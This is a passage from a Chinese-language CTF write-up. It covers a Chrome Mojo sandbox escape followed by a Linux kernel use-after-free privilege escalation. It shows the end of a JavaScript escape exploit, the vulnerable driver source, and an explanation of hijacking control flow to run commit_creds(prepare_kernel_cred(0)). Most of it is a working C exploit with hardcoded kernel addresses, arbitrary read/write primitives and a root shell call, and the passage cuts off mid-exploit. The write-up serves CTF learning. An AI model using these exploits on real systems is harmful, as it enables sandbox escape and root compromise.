    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Mojo<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"enabling mojo ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sandbox escape ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">await</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><img src="/images/68622871/13.png" alt="pwn"></p>
<p><strong>注意：</strong> script 引入的 mojo 目录实际上是题目的 mojo_bindings 目录<br><img src="/images/68622871/12.png" alt="mojo_bindings"></p>
<h3 id="简单的-kernel-pwn"><a href="#简单的-kernel-pwn" class="headerlink" title="简单的 kernel pwn"></a>简单的 kernel pwn</h3><p>逃逸拿到 shell 后就是 kernel pwn 提权了，题目直接就给了驱动的源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> ctf_cdev<span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> ctf_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>open <span class="token operator">=</span> ctf_open<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>release <span class="token operator">=</span> ctf_release<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>read <span class="token operator">=</span> ctf_read<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>write <span class="token operator">=</span> ctf_write<span class="token punctuation">,</span>
  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> ctf_ioctl<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>ctf_data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> ctf_data<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> ctf_data<span class="token operator">-></span>mem<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>off<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>ctf_data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> ctf_data<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>ctf_data<span class="token operator">-></span>mem<span class="token punctuation">,</span> data<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">ctf_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>data <span class="token operator">=</span> f<span class="token operator">-></span>private_data<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>

  <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">case</span> <span class="token number">1337</span><span class="token operator">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arg <span class="token operator">></span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    mem <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    data<span class="token operator">-></span>mem <span class="token operator">=</span> mem<span class="token punctuation">;</span>
    data<span class="token operator">-></span>size <span class="token operator">=</span> arg<span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>

  <span class="token keyword">case</span> <span class="token number">1338</span><span class="token operator">:</span>
    <span class="token function">kfree</span><span class="token punctuation">(</span>data<span class="token operator">-></span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>

  <span class="token keyword">default</span><span class="token operator">:</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>ENOTTY<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ctf_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  f<span class="token operator">-></span>private_data <span class="token operator">=</span> data<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ctf_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">kfree</span><span class="token punctuation">(</span>f<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>漏洞很简单，free 后指针未置为 NULL，可以 UAF</p>
<p>比较简单的方式是，UAF 修改 cred 结构体，但是题目的内核使用了一种 cred_jar 的安全机制，cred 的分配独立于普通的 malloc，所以无法使用这种方式</p>
<p>那么还可以利用 tty_struct 来劫持程序控制流执行 <code>commit_creds(prepare_kernel_cred(0))</code></p>
<p>也可以修改 file 结构体的 f_ops 指针来劫持程序控制流，并且 f_ops 调用时，rdi 寄存器指向的就是 file 结构体，可以利用 <code>set_memory_x(addr)</code> 来将 file 结构体的内存设置为可执行，随后布置 shellcode 执行 <code>commit_creds(prepare_kernel_cred(0))</code> 得到 root 权限</p>
<p>这部分比较简单，就直接放出 exp 了，相信结合注释很容易就看懂了：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">KERNCALL</span> <span class="token expression"><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PREPARE_KERNEL_CRED</span> <span class="token expression"><span class="token number">0xffffffff8108c2f0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">COMMIT_CREDS</span> <span class="token expression"><span class="token number">0xffffffff8108c0c0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SET_MEMORY_X</span> <span class="token expression"><span class="token number">0xffffffff8105b0d0</span></span></span>

<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MEM_SCAN_SIZE</span> <span class="token expression"><span class="token number">0x10000000</span></span></span>
<span class="token class-name">uint64_t</span> buffer<span class="token punctuation">[</span>MEM_SCAN_SIZE <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> fd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> ctf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">;</span> 
<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">;</span> 

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1338</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> size<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"setup uaf...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token comment">// ctf[0] -> fd[1]'s ctf_data</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// ctf[1] -> fd[2]'s ctf_data</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to setup uaf(1)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to setup uaf(2)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

